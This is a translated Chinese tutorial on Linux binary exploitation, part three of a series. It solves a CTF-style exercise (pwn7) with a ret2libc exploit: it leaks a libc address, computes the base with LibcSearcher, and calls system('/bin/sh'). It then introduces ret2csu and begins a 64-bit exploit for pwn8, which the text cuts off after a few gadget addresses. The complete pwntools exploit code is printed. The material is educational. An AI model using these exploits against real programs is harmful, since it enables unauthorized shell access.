# Linux pwn从入门到熟练（三）
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
Linux
pwn系列继续更新。近期终于花了一点时间把自己的坑填上。今天将首先为大家带来上篇文章遗留题目的解答。再次，将介绍两种pwn的方式。这两种pwn都是针对开启了NX保护的程序。其间，还给大家分享了我更新的工具[getOverFlowOffset](https://github.com/desword/shellcode_tools)。
该工具经过升级，能够同时应对开启和没有开启PIE的程序。支持分析32位和64位程序。欢迎大家提issue :)。
“纸上得来终觉浅,绝知此事要躬行”
——《冬夜读书示子聿》
时间久远，怕大家找不到从前的文章，特此给出传送门：
[Linux pwn从入门到熟练（二）](https://www.anquanke.com/post/id/168468)
[Linux pwn从入门到熟练](https://www.anquanke.com/post/id/164530)
## 练习题pwn7参考解答
前述[Linux
pwn从入门到熟练（二）](https://www.anquanke.com/post/id/168468)这篇文章留了一道习题pwn7给大家做。下面给出一种参考解答。
###  查看保护
可以发现。栈是不可以执行的。但是没有开启PIE/ALSR，即地址随机化。因此IDA查看的函数地址是可以直接使用的。
###  判断漏洞函数
可以发现，函数gets存在栈溢出漏洞。
###  获取溢出点距离EBP的偏移距离
这里，我推荐一个自己写的工具[getOverFlowOffset](https://github.com/desword/shellcode_tools)。
该工具经过我的升级，能够同时应对开启和没有开启PIE的程序。
它会自己检测程序是否开启了PIE，对于开启了PIE的程序，它会通过程序里面调用的其他库函数泄露正确的地址，并将存在漏洞的返回地址修正。比如：
    $ python getOverFlowOffset.py 0x00000632 example_bin/pwn200_PIE
    [*] example_bin/pwn200_PIE is 32 bits
    [*] PIE is enabled
    [*] Found a leak function: write
    [*] Found the leaked address 0x565556c2, we can leave
    [*] The real vul_ret_address is:0x56555632
    [+] Found offset to the EBP is 108.
    [+] THe offset to the RET_ADDR is 112 (32bits) or 116 (64bits).
在本程序中，没有开启PIE，因此有如下的结果：
    $ python getOverFlowOffset.py 0x08048695 ~/pwn_execrise/pwn_basic_rop_2/pwn7
    [*] /home/desword/pwn_execrise/pwn_basic_rop_2/pwn7 is 32 bits
    [*] no PIE
    [+] Found offset to the EBP is 108.
    [+] THe offset to the RET_ADDR is 112 (32bits) or 116 (64bits).
可以发现，溢出点距离EBP的距离是108字节。该程序是32位程序，因此距离存储了返回地址的距离是112字节。
###  分析是否载入了系统函数
从该程序的提示和查看导入函数表我们可以发现，并没有可以直接用于获取shell的系统函数了（如：system,
execve）。我们会马上想到[上一篇文章](https://www.anquanke.com/post/id/168468)提到的写shellcodes,
构造syscall的方法。但是，我们前面查保护的时候又发现，该程序开启了栈不可执行保护（NX）。因此也是不可能构造shellcode
了。我们需要自己主动的从系统库libc中提取用于获取shell的库函数。
那么我们怎么提取用于获取shell的库函数呢？
libc动态库载入时，其内库函数地址的构成：
    库函数f载入地址：f@load = libc@load + f_offset@libc
    即库函数f载入地址由libc动态库载入时的基地址+库函数在libc动态库中的偏移。
包括两个主要步骤，
  1. 获取动态链接库libc被pwn7程序载入时的基地址libc_base；
  2. 将目标库函数的地址更新位pwn7程序载入的地址。
###  获取libc基地址
那么如何获取libc的基地址呢？  
我们从上述库函数f载入地址的构成就能够窥探出一丝技巧：如果我们泄露任意一个pwn7程序已经载入的属于libc动态库的函数地址f[@load](https://github.com/load
"@load")（比如__libc_start_main），然后在函数f在libc中的偏移f_offset[@libc](https://github.com/libc
"@libc")已知的情况下，就能够反推出libc载入的基地址libc[@load](https://github.com/load
"@load")了，即：
    libc@load  =  f@load - f_offset@libc
其中f_offset[@libc](https://github.com/libc "@libc")对于一个确定的动态库libc是固定的，且可以静态的获得。
因此，pwn7漏洞利用的大致步骤为：
  1. 溢出目标 中已经载入的函数的地址，比如__libc_start_main
  2. 搜索载入的libc的库，并且libc库中的函数相对偏移已经获得
  3. 计算libc的基地址，通过载入函数的地址__libc_start_main 减去libc中__libc_start_main的相对偏移
  4. 搜索libc中的system的偏移，
  5. 搜索libc中的/bin/sh字符串的偏移，
  6. 最终构造函数的利用
这里，为了通过泄露的库函数地址，来获得libc的基地址，我们借助了一个工具：
需要借助的工具。[LibcSearch](https://github.com/lieanu/LibcSearcher)
该工具的安装方法为
    git clone https://github.com/lieanu/LibcSearcher.git
    cd LibcSearcher
    python setup.py develop
一般的使用方法为
    obj = LibcSearcher("fgets", 0X7ff39014bd90)
    libcbase = 0X7ff39014bd90 – obj.dump("fgets")
    system_addr = libcbase + obj.dump("system")        #system 偏移
    bin_sh_addr = libcbase + obj.dump("str_bin_sh")    #/bin/sh 偏移
    libcmain_addr = libcbase + obj.dump("__libc_start_main_ret")
###  完整的exp
    # coding=utf-8
    #!/usr/bin/env python
    from pwn import *
    from LibcSearcher import LibcSearcher
    sh = process('./pwn7')
    pwn7 = ELF('./pwn7')
    puts_plt = pwn7.plt['puts']
    libc_start_main_got = pwn7.got['__libc_start_main'] #  载入的libc_main函数的地址。
    main = pwn7.symbols['main']
    success("leak libc_start_main addr and return to main again")
    payload = flat(['A' * 112, puts_plt, main, libc_start_main_got]) # 首先通过puts函数的执行，将libc_main的载入地址泄漏出来。
    sh.sendlineafter('Can you find it !?', payload)
    success("get the libc base, and get system@got")
    libc_start_main_addr = u32(sh.recv()[0:4])
    libc = LibcSearcher('__libc_start_main', libc_start_main_addr)   # 搜索系统中所载入的libc库，并且自动读取里面的所有导出函数的相对地址。
    libcbase = libc_start_main_addr - libc.dump('__libc_start_main') # 载入的libc_main地址减去，libc_main在libc库中的偏移，就是libc的基地址。
    system_addr = libcbase + libc.dump('system')   # 从而获得system的载入地址
    binsh_addr = libcbase + libc.dump('str_bin_sh') # 从而获得 /bin/sh字符串的载入地址
    payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr]) 
    sh.sendline(payload)
    sh.interactive()
###  exp的栈分布图解：
**为了泄露__libc_start_main地址的栈空间分布变化**
    payload = flat(['A' * 112, puts_plt, main, libc_start_main_got]) # 首先通过puts函数的执行，将libc_main的载入地址泄漏出来。
上述图中的右侧图展示了对应栈空间里面数值表达的含义。
**为了获取shell时栈空间分布变化**
    payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
注意，选择libc的版本时，选择32位的，即第1个选项。
## 64位程序通用ROP的构建
对于64位程序，有一个可以获取通用ROP的方案，该方案来自于论文：
[black asia 2018]return-to-csu: A New Method to Bypass 64-bit Linux ASLR
[Paper](https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/asis18_ret2csu_wp.pdf),[Slides](https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/asia18_ret2csu.pdf)
在某些程序中，我们会发现可以用来构造ROP的
gadgets较少。因此可以利用上述通用ROP方案。由于，该方法的核心是利用函数__libc_csu_init中的代码，因此成为ret2csu。
构造ROP的核心步骤包括三点：
其一是获得用于获取shell的库函数地址，
其二是安排该库函数在合适的位置被调用，
其三是如何巧妙的向函数传参数。
主要思想是：在每个64位的linux程序中都有一段初始化的代码，该代码中含有一段可以被用来间接给函数输入参数赋值的代码。
该段通用代码位于__libc_csu_init函数中：
借用论文中的gadgets图来说明调用方式：
在64位的程序中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。
因此，对应于上述提到的三点核心的后面两点：
**其二是安排该库函数在合适的位置被调用** ：可以发现，在gadget
2中，可以利用callq来调用地址%r12+%rbx*8指向的函数。我们可以设置rbx=0，那么就变成%r12寄存器指向的函数。而%r12寄存器的值可以利用gadget
1中的代码从栈中指定位置获取。
**其三是如何巧妙的向函数传参数** ：从gadget 2中可以发现64位程序前三个输入参数存入的寄存器rdi, rsi, rdx分别可以从寄存器r15d,
r14, r13中获取值。而结合gadget 1，可以发现r15d, r14,
r13的值可以从栈中获取。那么通过合理的分配栈中的数据，我们就可以顺利的控制参数数值了。三个参数对于大部分的漏洞利用而言，基本够用了。
下面以一道zhengmin大神的level 5 , 64位程序来讲解。
[Pwn8](https://github.com/desword/pwn_execrise/blob/master/pwn_basic_rop_3/pwn8)
那么我们回到本题中，迅速的三连。
###  快速三连：查保护，查漏洞，算偏移
开启了栈不可执行保护（NX）。没有开启PIE和canary。
溢出的原因是对于char类型变量，可以输入超长的长度。
    $ python getOverFlowOffset.py  0x0000000000400563 ~/pwn_execrise/pwn_basic_rop_3/pwn8
    [*] /home/desword/pwn_execrise/pwn_basic_rop_3/pwn8 is 64 bits
    [*] no PIE
    [+] Found offset to the EBP is 128.
    [+] THe offset to the RET_ADDR is 132 (32bits) or 136 (64bits)
距离EBP的偏移是128，距离返回地址的覆盖是136字节。
###  分析利用方式
值得注意的是，本题中的__libc_csu_init汇编结果不同，寄存器赋值的顺序也变了。但是只要利用的思路理解了，只要稍微调整一下即可。
###  完整的EXP
    from pwn import *
    from LibcSearcher import *
    #context.log_level = 'debug'
    pwn8 = ELF('./pwn8')
    sh = process('./pwn8')
    write_got = pwn8.got['write']
    read_got = pwn8.got['read']
    main_addr = pwn8.symbols['main']
    bss_base = pwn8.bss()
    csu_front_addr = 0x00000000004005F0 # gadget 2.
    csu_end_addr = 0x0000000000400606 # gadget 1, 
    fakeebp = 'b' * 8